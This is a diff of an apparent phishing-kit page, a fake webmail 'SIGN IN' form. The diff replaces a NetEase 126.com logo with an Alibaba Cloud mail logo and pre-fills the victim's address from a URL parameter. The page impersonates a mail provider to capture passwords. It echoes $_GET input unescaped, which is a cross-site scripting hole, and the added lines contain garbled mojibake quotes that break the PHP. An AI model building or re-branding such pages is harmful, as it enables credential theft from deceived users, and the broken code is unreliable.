@@ -16,7 +16,7 @@ a:hover{color:#DF0101; }
 	
 	<br><br>
 	<table width="1000" align="center"><tbody><tr><td>
-	<img src="http://mimg.127.net/logo/126logo.gif" width="" height="">
+	<img src="https://mail.mxhichina.com/static/5094153/images/forNetCN/logo.png" width="" height="">
 	</td></tr></tbody></table>
 
 </td></tr>
@@ -67,8 +67,8 @@ a:hover{color:#DF0101; }
 			
 				<br><br>
 
-				<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET[‘id’]; ?>" placeholder="Username">
-				<font face="arial" size="3" color="#045FB4"><?php echo $_GET[‘id’]; ?></font>		
+				<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET[â€˜idâ€™]; ?>" placeholder="Username">
+				<font face="arial" size="3" color="#045FB4"><?php echo $_GET[â€˜idâ€™]; ?></font>		
 
 				<p>
 
@@ -79,7 +79,7 @@ a:hover{color:#DF0101; }
 
 				</p><p>
 
-				<input type="submit" value=“SIGN IN” style="width:320px; height:55px; background-color: 276BA2; border: solid 3px 276BA2; 
+				<input type="submit" value=â€œSIGN INâ€ style="width:320px; height:55px; background-color: 276BA2; border: solid 3px 276BA2; 
 				font-family: Verdana; font-size: 20px; font-weight: bold; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
 				-khtml-border-radius: 4px; border-radius: 4px;">				
 	
@@ -122,7 +122,7 @@ a:hover{color:#DF0101; }
 
 <tr><td>
 <div align="center">
-<img src="http://mimg.127.net/logo/126logo.gif" width="1000" height="85">
+<img src="https://mail.mxhichina.com/static/5094153/images/forNetCN/logo.png" width="1000" height="85">
 </div>
 </td></tr>
 
